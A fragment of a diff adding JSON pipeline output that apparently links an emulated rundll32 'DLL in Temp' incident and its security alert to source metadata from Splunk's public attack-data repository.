+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          }
+        },
+        {
+          "id": "incident-0b1f1cd90fc42f25ca038e671fbc3fe4e9203e5936a0fa55311c34dc23e1304b",
+          "label": "Incident",
+          "name": "Attack Range rundll32 DLL in Temp emulation",
+          "properties": {
+            "derived": true,
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "ground_truth_kind": "emulation_scenario",
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          }
+        },
+        {
+          "id": "alarm-d190df5ee1d9c776316551f06e8a3e025ccfe999440f45a9990d63faeb9af2d8",
+          "label": "SecurityAlert",
+          "name": "rundll32-temp-dll-v1",
+          "properties": {
+            "derived": true,
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "rule_version": "rundll32-temp-dll-v1",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          }
+        }
+      ]
+    }
+  },
+  "status": "complete",
+  "elapsed_seconds": 13.256880017,
+  "finished_at": "2026-09-21T10:26:23.976689+00:00"
+}
